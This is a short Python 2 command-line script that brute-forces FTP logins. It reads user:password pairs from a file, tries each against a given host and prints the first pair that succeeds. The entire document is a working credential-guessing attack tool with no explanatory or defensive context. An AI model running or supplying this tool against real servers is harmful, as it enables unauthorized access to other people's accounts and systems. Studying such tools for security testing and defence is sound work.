import ftplib
import optparse

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: "+userName+"/"+passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)

def main():
	parser = optparse.OptionParser("usage%prog "+"-H <direction> -d <path>")
	parser.add_option('-H', dest='hname', type='string', help='specify host ip')
	parser.add_option('-d', dest='dname', type='string', help='specify direction text credentials')
	(options, args) = parser.parse_args()
	if (options.hname == None) | (options.dname == None):
		print parser.usage
		exit(0)
	else:
		bruteLogin(options.hname, options.dname)

if __name__ == '__main__':
	main()